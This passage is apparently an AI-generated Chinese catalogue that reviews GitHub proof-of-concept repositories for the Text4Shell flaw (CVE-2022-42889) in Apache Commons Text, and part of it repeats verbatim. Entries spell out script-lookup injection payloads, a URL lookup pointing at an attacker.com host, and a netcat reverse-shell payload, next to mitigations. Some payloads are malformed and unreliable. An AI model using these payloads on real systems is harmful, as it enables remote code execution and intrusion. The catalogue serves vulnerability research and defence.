2.  **找到应用程序中接受用户输入的地方，这些输入最终会被传递给 Apache Commons Text 的插值功能。**
3.  **构造包含恶意表达式的Payload，例如`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}` 或 `${url:http://attacker.com/evil.txt}`。**
4.  **将Payload作为输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或与远程服务器进行交互。**

**防范措施：**

*   **升级到Apache Commons Text 1.10.0或更高版本。该版本默认禁用了不安全的StringLookup实现。**
*   **如果无法升级，可以手动禁用不安全的StringLookup实现。**
*   **验证所有用户输入，防止恶意表达式注入。**

**项目地址:** [vickyaryan7/Text4shell-exploit](https://github.com/vickyaryan7/Text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---



---

## POC #22

**来源**: [CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令。

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户可控的字符串传递给`StringSubstitutor`进行插值。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为“Text4Shell”，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于程序在处理用户提供的输入时，使用了不安全的默认插值器，允许攻击者利用`script`、`dns`和`url`等前缀执行任意代码或与远程服务器通信。

**有效性分析：**

提供的PoC代码看起来是有效的。它通过生成包含恶意payload的URL，来触发远程代码执行。payload利用了`script`、`url`、`dns`等lookup来执行命令。

**投毒风险分析：**

PoC代码存在轻微的投毒风险。主要风险点在于：

1.  **Payload下载地址：** 代码首先从`https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt` 下载payloads，如果该地址被篡改，可能会导致执行恶意代码。当然从payloads-final.txt的命名可以看出， payload还需要经过gau命令和grep命令过滤。风险降低。
2.  **外部命令执行：** 代码使用了`os.system` 来执行`wget`, `gau`, `qsreplace`, `ffuf` 命令。如果这些命令本身存在漏洞或者被替换为恶意程序，也可能导致攻击。
3. **Collaborator URL：** 此PoC会默认将流量导向id.burpcollaborator.com，若此域名被劫持，则存在一定的安全隐患。

综上，投毒风险约为10%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了受影响的Apache Commons Text版本（1.5 <= version <= 1.9），并且允许用户控制的字符串传递给`StringSubstitutor`进行插值处理。
2.  **构造Payload：** 使用`script`、`dns`或`url`等前缀构造恶意payload，例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${dns:address:java.lang.Runtime.getRuntime().exec('command')}`
3.  **传递Payload：** 将构造好的payload作为输入传递给目标应用程序。这可能通过URL参数、POST请求数据、或其他任何应用程序接受用户输入的地方。
4.  **触发执行：** 当应用程序使用`StringSubstitutor`对包含payload的字符串进行插值处理时，payload中的命令将被执行，从而实现远程代码执行。

**缓解措施：**

*   升级到Apache Commons Text 1.10.0或更高版本。
*   禁用或删除不安全的插值器（`script`、`dns`、`url`）。
*   对用户输入进行严格的验证和过滤。

**项目地址:** [kljunowsky/CVE-2022-42889-text4shell](https://github.com/kljunowsky/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #23

**来源**: [CVE-2022-42889-korteke_CVE-2022-42889-POC.md](../2022/CVE-2022-42889-korteke_CVE-2022-42889-POC.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致远程代码执行，完全控制受影响系统

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许处理不可信的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个高危漏洞。该漏洞源于程序在处理变量插值时，允许动态评估和扩展属性。在1.5到1.9版本中，默认包含的Lookup实例集中存在可能导致任意代码执行或与远程服务器通信的插值器，例如 "script" (使用JVM脚本引擎执行表达式), "dns" (解析DNS记录) 和 "url" (从URL加载值)。

**有效性：**
提供的POC代码利用了这些插值器来演示漏洞的利用。`README.md` 文件中给出了利用 `script`, `dns`, 和 `url` 前缀的示例，展示了如何执行任意代码（创建 `/tmp/blop` 文件）和进行网络交互。Dockerfile用于构建一个包含受影响版本的Commons Text的应用，方便漏洞演示。

**投毒风险：**
该仓库的主要目的是演示漏洞，并提供可利用的payload。但是，`mvnw` 文件（Maven Wrapper）是从互联网下载的，理论上存在被替换为恶意文件的风险，但这属于Maven Wrapper本身的信任问题，并非作者专门植入的后门。考虑到代码仓库的主要目的是漏洞演示，且利用方式较为直接，投毒的可能性较低，估计在10%左右。

**利用方式：**
攻击者可以构造包含恶意表达式的输入，利用 Commons Text 的变量插值功能执行任意代码或进行网络交互。例如：

*   `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}` 执行系统命令。
*   `${dns:address|HOST}` 进行DNS解析，攻击者可以监控解析请求。
*   `${url:UTF-8:http://HOST}` 从指定URL加载内容，攻击者可以控制返回的内容。

应用程序如果使用受影响版本的 Commons Text，并且允许用户控制用于插值的字符串，则可能受到此漏洞的影响。修复方法是将 Apache Commons Text 升级到 1.10.0 或更高版本，该版本默认禁用有问题的插值器。

**项目地址:** [korteke/CVE-2022-42889-POC](https://github.com/korteke/CVE-2022-42889-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #24

**来源**: [CVE-2022-42889-necroteddy_CVE-2022-42889.md](../2022/CVE-2022-42889-necroteddy_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认配置，允许攻击者通过构造包含恶意表达式的输入字符串来执行任意代码。

**有效性：**
提供的POC代码有效，因为它提供了一个Docker环境来复现该漏洞，包括Dockerfile、README.md以及一个简单的Java应用（尽管未提供Java源码，但是dockerfile中指明了构建方式）。README.md中明确说明了利用方式，并提供了可以执行任意命令的payload示例，如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}`。

**投毒风险：**
代码仓库中可能存在作者隐藏的投毒代码的风险较低。主要基于以下几点：
*   README.md 详细描述了如何构建和运行POC，意图是演示漏洞，而不是隐藏恶意代码。
*   提供的 `mask_cnn.ipynb` 似乎与漏洞利用本身无关，更像是与图像处理或机器学习相关的示例代码，虽然与漏洞无关，但提高了项目复杂性，存在一定的迷惑性,notebook文件无法直接分析是否是投毒代码.
*  Dockerfile 简单，没有包含任何可疑的命令。
*  考虑到漏洞本身的严重性，直接利用该漏洞执行恶意操作比在POC中隐藏后门更加直接有效。POC提供的重点在于演示漏洞。
总体而言，投毒风险较低，估计在 10% 左右。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9版本。
2.  应用程序允许用户可控的字符串传递给 `StringSubstitutor.replace()` 方法或其他执行变量插值的方法。
3.  攻击者构造包含恶意表达式的字符串，例如使用 `script`, `dns`, 或 `url` 前缀。
4.  Commons Text 对该字符串进行插值，执行表达式，从而导致任意代码执行或与其他服务器建立连接。
例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`：执行任意系统命令。
    *   `${dns:address|example.com}`：解析指定域名的DNS记录，可能导致信息泄露。
    *   `${url:UTF-8:http://example.com}`：从指定URL加载内容，可能导致SSRF攻击。

**项目地址:** [necroteddy/CVE-2022-42889](https://github.com/necroteddy/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #25

**来源**: [CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md](../2022/CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md)

## CVE-2022-42889 - Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的输入被用于变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认设置，允许攻击者在处理不可信的输入时执行任意代码。漏洞存在于1.5到1.9版本的Apache Commons Text中。 

**有效性：**根据漏洞库信息、搜索引擎结果和已知的利用案例，该漏洞利用是有效的。许多文章都确认了其远程代码执行的能力。

**投毒风险：** 提供的代码片段是一个`CONTRIBUTING.md`文件，它与漏洞本身无关，而是Apache Commons Text项目的贡献指南。 虽然贡献指南本身不会造成直接的投毒，但若攻击者恶意修改构建脚本或其它代码并提交PR，存在潜在的投毒风险。这个`CONTRIBUTING.md`文件中隐藏恶意代码的可能性极低，因为此文件本身不是可执行代码，混淆难度大，容易被发现。因此判断投毒风险较低，约为5%。

**利用方式：**
1.  **利用变量插值：** 攻击者需要找到应用程序中使用Apache Commons Text进行变量插值的地方。
2.  **构造恶意输入：** 攻击者构造包含恶意表达式的输入字符串，例如使用`script`，`dns`，或`url`前缀的表达式。例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')}`。
3.  **触发代码执行：** 当应用程序使用Apache Commons Text处理该输入时，库会尝试解析并执行恶意表达式，从而导致远程代码执行。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   禁用或限制在变量插值中使用`script`、`dns`和`url`等前缀。
*   对所有用户提供的输入进行严格的验证和清理。

**项目地址:** [shoucheng3/asf__commons-text_CVE-2022-42889_1-9](https://github.com/shoucheng3/asf__commons-text_CVE-2022-42889_1-9)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #26

**来源**: [CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md](../2022/CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md)

## CVE-2022-42889-Text4Shell-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。受影响的版本中，默认的文本插值器包含不安全的查找器，例如`script`、`dns`和`url`。攻击者可以通过构造包含恶意表达式的输入，利用这些查找器执行任意代码或与远程服务器交互。

**有效性分析：**
提供的PoC代码是一个Spring Boot应用程序，它使用了存在漏洞的Apache Commons Text版本。Dockerfile用于构建包含该漏洞的Docker镜像。README.md文件详细说明了如何构建、运行该镜像，并通过构造特定的URL来触发远程代码执行。PoC通过在容器内部创建一个名为`p0wned`的文件来验证漏洞的成功利用。根据README.md文件的描述，以及`docker scan`的输出，可以确认该PoC是有效的。

**投毒风险分析：**
该仓库中存在一定概率的投毒风险，因为作者可以很容易地在可执行的payload中植入恶意代码。例如，`script:javascript:java.lang.Runtime.getRuntime().exec()`可以执行任何系统命令，作者可以在这里插入后门代码，例如反弹shell或下载执行恶意脚本。虽然PoC本身是为了演示漏洞，但潜在的恶意行为者可能会修改PoC以包含其他恶意功能。这里判断投毒风险为10%，主要考虑到该PoC相对简单，直接，旨在演示 RCE，但不能完全排除隐蔽投毒的可能性。

**利用方式：**
1.  攻击者需要找到一个应用程序，该应用程序使用了存在漏洞的Apache Commons Text版本（1.5到1.9）。
2.  攻击者需要确定应用程序中是否存在任何接受用户输入并将其传递给Commons Text的文本插值功能的位置。
3.  攻击者构造一个包含恶意表达式的输入。该表达式利用`script`、`dns`或`url`查找器来执行任意代码。例如：`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
4.  应用程序处理该输入，触发文本插值，导致恶意代码被执行。

**项目地址:** [sunnyvale-it/CVE-2022-42889-PoC](https://github.com/sunnyvale-it/CVE-2022-42889-PoC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #27

**来源**: [CVE-2022-42889-tulhan_commons-text-goat.md](../2022/CVE-2022-42889-tulhan_commons-text-goat.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行，可能导致系统完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户控制的输入传递给`StringSubstitutor`进行插值

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中`StringSubstitutor`类的变量插值功能。如果应用程序使用受影响的Apache Commons Text版本（1.5到1.9）且允许用户控制的输入传递给`StringSubstitutor`进行插值，则攻击者可以通过构造包含恶意脚本、DNS或URL查找的输入来执行任意代码。根据漏洞利用代码，该代码提供了一个易受攻击的Web应用程序，它接受`cmd`参数，并将其传递给`StringSubstitutor`函数，从而允许RCE。由于该仓库的目的是为了漏洞演示，LICENSE文件使用的是标准的MIT协议，没有发现作者隐藏的投毒代码。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本（1.5-1.9）。**
2.  **识别应用程序中将用户控制的输入传递给`StringSubstitutor`进行插值的位置。**
3.  **构造包含恶意脚本、DNS或URL查找的输入。例如：**`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}`**，`${dns:address}`**或者`${url:https://example.com}`**。**
4.  **将恶意输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将在目标系统上执行任意代码。**

根据搜索结果，此漏洞被认为是高危漏洞，CVSS评分高达9.8，可能允许攻击者在受影响的系统上执行任意代码。 Apache Commons Text 1.10.0 通过禁用默认的危险插值器修复了此漏洞。

**项目地址:** [tulhan/commons-text-goat](https://github.com/tulhan/commons-text-goat)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #28

**来源**: [CVE-2022-42889-vickyaryan7_Text4shell-exploit.md](../2022/CVE-2022-42889-vickyaryan7_Text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给存在漏洞的插值函数。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个关键漏洞。该漏洞源于Apache Commons Text在处理变量插值时，默认包含了一些不安全的 StringLookup 实现，如 `script`、`dns` 和 `url`。攻击者可以通过构造包含恶意表达式的输入，利用这些 StringLookup 实现执行任意代码或与远程服务器进行交互。

**有效性：**

提供的Python POC代码尝试利用此漏洞。它通过构造包含恶意`script`查找的payload，将其作为GET请求的参数发送到目标URL。Payload中的命令`nc {args.ip} {args.port} -e {args.type}`使用netcat建立反向shell连接到攻击者的机器。如果目标系统运行着存在漏洞的Apache Commons Text版本，并且netcat可用，则此POC应有效。

**投毒风险：**

代码本身并没有明显的投毒行为。这段代码的主要目的是利用漏洞，建立反向shell。代码包含MIT许可证，表面上代码作者允许代码使用者复制、修改、合并、发布、分发、再许可和/或出售软件的副本，但并不能完全排除未来作者修改代码进行投毒行为的可能性。风险占比5%。主要考虑到以下几点：

*   **依赖netcat：** POC依赖目标系统安装了netcat。如果目标系统没有netcat，则漏洞利用会失败，但不会造成其他损害。
*   **反向Shell：**  反向Shell本身有风险，因为它允许攻击者远程访问受害者的系统。但是，这是漏洞利用本身的性质，而不是代码作者故意引入的恶意行为。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本 (1.5 <= version <= 1.9)。**
2.  **找到应用程序中接受用户输入的地方，这些输入最终会被传递给 Apache Commons Text 的插值功能。**
3.  **构造包含恶意表达式的Payload，例如`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}` 或 `${url:http://attacker.com/evil.txt}`。**
4.  **将Payload作为输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或与远程服务器进行交互。**

**防范措施：**

*   **升级到Apache Commons Text 1.10.0或更高版本。该版本默认禁用了不安全的StringLookup实现。**
*   **如果无法升级，可以手动禁用不安全的StringLookup实现。**
*   **验证所有用户输入，防止恶意表达式注入。**

**项目地址:** [vickyaryan7/Text4shell-exploit](https://github.com/vickyaryan7/Text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---



---

## POC #22

**来源**: [CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-kljunowsky_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令。

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户可控的字符串传递给`StringSubstitutor`进行插值。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为“Text4Shell”，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于程序在处理用户提供的输入时，使用了不安全的默认插值器，允许攻击者利用`script`、`dns`和`url`等前缀执行任意代码或与远程服务器通信。

**有效性分析：**

提供的PoC代码看起来是有效的。它通过生成包含恶意payload的URL，来触发远程代码执行。payload利用了`script`、`url`、`dns`等lookup来执行命令。

**投毒风险分析：**

PoC代码存在轻微的投毒风险。主要风险点在于：

1.  **Payload下载地址：** 代码首先从`https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt` 下载payloads，如果该地址被篡改，可能会导致执行恶意代码。当然从payloads-final.txt的命名可以看出， payload还需要经过gau命令和grep命令过滤。风险降低。
2.  **外部命令执行：** 代码使用了`os.system` 来执行`wget`, `gau`, `qsreplace`, `ffuf` 命令。如果这些命令本身存在漏洞或者被替换为恶意程序，也可能导致攻击。
3. **Collaborator URL：** 此PoC会默认将流量导向id.burpcollaborator.com，若此域名被劫持，则存在一定的安全隐患。

综上，投毒风险约为10%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了受影响的Apache Commons Text版本（1.5 <= version <= 1.9），并且允许用户控制的字符串传递给`StringSubstitutor`进行插值处理。
2.  **构造Payload：** 使用`script`、`dns`或`url`等前缀构造恶意payload，例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}`
    *   `${dns:address:java.lang.Runtime.getRuntime().exec('command')}`
3.  **传递Payload：** 将构造好的payload作为输入传递给目标应用程序。这可能通过URL参数、POST请求数据、或其他任何应用程序接受用户输入的地方。
4.  **触发执行：** 当应用程序使用`StringSubstitutor`对包含payload的字符串进行插值处理时，payload中的命令将被执行，从而实现远程代码执行。

**缓解措施：**

*   升级到Apache Commons Text 1.10.0或更高版本。
*   禁用或删除不安全的插值器（`script`、`dns`、`url`）。
*   对用户输入进行严格的验证和过滤。

**项目地址:** [kljunowsky/CVE-2022-42889-text4shell](https://github.com/kljunowsky/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #23

**来源**: [CVE-2022-42889-korteke_CVE-2022-42889-POC.md](../2022/CVE-2022-42889-korteke_CVE-2022-42889-POC.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致远程代码执行，完全控制受影响系统

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许处理不可信的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个高危漏洞。该漏洞源于程序在处理变量插值时，允许动态评估和扩展属性。在1.5到1.9版本中，默认包含的Lookup实例集中存在可能导致任意代码执行或与远程服务器通信的插值器，例如 "script" (使用JVM脚本引擎执行表达式), "dns" (解析DNS记录) 和 "url" (从URL加载值)。

**有效性：**
提供的POC代码利用了这些插值器来演示漏洞的利用。`README.md` 文件中给出了利用 `script`, `dns`, 和 `url` 前缀的示例，展示了如何执行任意代码（创建 `/tmp/blop` 文件）和进行网络交互。Dockerfile用于构建一个包含受影响版本的Commons Text的应用，方便漏洞演示。

**投毒风险：**
该仓库的主要目的是演示漏洞，并提供可利用的payload。但是，`mvnw` 文件（Maven Wrapper）是从互联网下载的，理论上存在被替换为恶意文件的风险，但这属于Maven Wrapper本身的信任问题，并非作者专门植入的后门。考虑到代码仓库的主要目的是漏洞演示，且利用方式较为直接，投毒的可能性较低，估计在10%左右。

**利用方式：**
攻击者可以构造包含恶意表达式的输入，利用 Commons Text 的变量插值功能执行任意代码或进行网络交互。例如：

*   `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}` 执行系统命令。
*   `${dns:address|HOST}` 进行DNS解析，攻击者可以监控解析请求。
*   `${url:UTF-8:http://HOST}` 从指定URL加载内容，攻击者可以控制返回的内容。

应用程序如果使用受影响版本的 Commons Text，并且允许用户控制用于插值的字符串，则可能受到此漏洞的影响。修复方法是将 Apache Commons Text 升级到 1.10.0 或更高版本，该版本默认禁用有问题的插值器。

**项目地址:** [korteke/CVE-2022-42889-POC](https://github.com/korteke/CVE-2022-42889-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #24

**来源**: [CVE-2022-42889-necroteddy_CVE-2022-42889.md](../2022/CVE-2022-42889-necroteddy_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认配置，允许攻击者通过构造包含恶意表达式的输入字符串来执行任意代码。

**有效性：**
提供的POC代码有效，因为它提供了一个Docker环境来复现该漏洞，包括Dockerfile、README.md以及一个简单的Java应用（尽管未提供Java源码，但是dockerfile中指明了构建方式）。README.md中明确说明了利用方式，并提供了可以执行任意命令的payload示例，如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}`。

**投毒风险：**
代码仓库中可能存在作者隐藏的投毒代码的风险较低。主要基于以下几点：
*   README.md 详细描述了如何构建和运行POC，意图是演示漏洞，而不是隐藏恶意代码。
*   提供的 `mask_cnn.ipynb` 似乎与漏洞利用本身无关，更像是与图像处理或机器学习相关的示例代码，虽然与漏洞无关，但提高了项目复杂性，存在一定的迷惑性,notebook文件无法直接分析是否是投毒代码.
*  Dockerfile 简单，没有包含任何可疑的命令。
*  考虑到漏洞本身的严重性，直接利用该漏洞执行恶意操作比在POC中隐藏后门更加直接有效。POC提供的重点在于演示漏洞。
总体而言，投毒风险较低，估计在 10% 左右。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9版本。
2.  应用程序允许用户可控的字符串传递给 `StringSubstitutor.replace()` 方法或其他执行变量插值的方法。
3.  攻击者构造包含恶意表达式的字符串，例如使用 `script`, `dns`, 或 `url` 前缀。
4.  Commons Text 对该字符串进行插值，执行表达式，从而导致任意代码执行或与其他服务器建立连接。
例如：
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`：执行任意系统命令。
    *   `${dns:address|example.com}`：解析指定域名的DNS记录，可能导致信息泄露。
    *   `${url:UTF-8:http://example.com}`：从指定URL加载内容，可能导致SSRF攻击。

**项目地址:** [necroteddy/CVE-2022-42889](https://github.com/necroteddy/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #25

**来源**: [CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md](../2022/CVE-2022-42889-shoucheng3_asf__commons-text_CVE-2022-42889_1-9.md)

## CVE-2022-42889 - Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的输入被用于变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个严重漏洞。该漏洞源于库中存在不安全的变量插值默认设置，允许攻击者在处理不可信的输入时执行任意代码。漏洞存在于1.5到1.9版本的Apache Commons Text中。 

**有效性：**根据漏洞库信息、搜索引擎结果和已知的利用案例，该漏洞利用是有效的。许多文章都确认了其远程代码执行的能力。

**投毒风险：** 提供的代码片段是一个`CONTRIBUTING.md`文件，它与漏洞本身无关，而是Apache Commons Text项目的贡献指南。 虽然贡献指南本身不会造成直接的投毒，但若攻击者恶意修改构建脚本或其它代码并提交PR，存在潜在的投毒风险。这个`CONTRIBUTING.md`文件中隐藏恶意代码的可能性极低，因为此文件本身不是可执行代码，混淆难度大，容易被发现。因此判断投毒风险较低，约为5%。

**利用方式：**
1.  **利用变量插值：** 攻击者需要找到应用程序中使用Apache Commons Text进行变量插值的地方。
2.  **构造恶意输入：** 攻击者构造包含恶意表达式的输入字符串，例如使用`script`，`dns`，或`url`前缀的表达式。例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')}`。
3.  **触发代码执行：** 当应用程序使用Apache Commons Text处理该输入时，库会尝试解析并执行恶意表达式，从而导致远程代码执行。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   禁用或限制在变量插值中使用`script`、`dns`和`url`等前缀。
*   对所有用户提供的输入进行严格的验证和清理。

**项目地址:** [shoucheng3/asf__commons-text_CVE-2022-42889_1-9](https://github.com/shoucheng3/asf__commons-text_CVE-2022-42889_1-9)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #26

**来源**: [CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md](../2022/CVE-2022-42889-sunnyvale-it_CVE-2022-42889-PoC.md)

## CVE-2022-42889-Text4Shell-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。受影响的版本中，默认的文本插值器包含不安全的查找器，例如`script`、`dns`和`url`。攻击者可以通过构造包含恶意表达式的输入，利用这些查找器执行任意代码或与远程服务器交互。

**有效性分析：**
提供的PoC代码是一个Spring Boot应用程序，它使用了存在漏洞的Apache Commons Text版本。Dockerfile用于构建包含该漏洞的Docker镜像。README.md文件详细说明了如何构建、运行该镜像，并通过构造特定的URL来触发远程代码执行。PoC通过在容器内部创建一个名为`p0wned`的文件来验证漏洞的成功利用。根据README.md文件的描述，以及`docker scan`的输出，可以确认该PoC是有效的。

**投毒风险分析：**
该仓库中存在一定概率的投毒风险，因为作者可以很容易地在可执行的payload中植入恶意代码。例如，`script:javascript:java.lang.Runtime.getRuntime().exec()`可以执行任何系统命令，作者可以在这里插入后门代码，例如反弹shell或下载执行恶意脚本。虽然PoC本身是为了演示漏洞，但潜在的恶意行为者可能会修改PoC以包含其他恶意功能。这里判断投毒风险为10%，主要考虑到该PoC相对简单，直接，旨在演示 RCE，但不能完全排除隐蔽投毒的可能性。

**利用方式：**
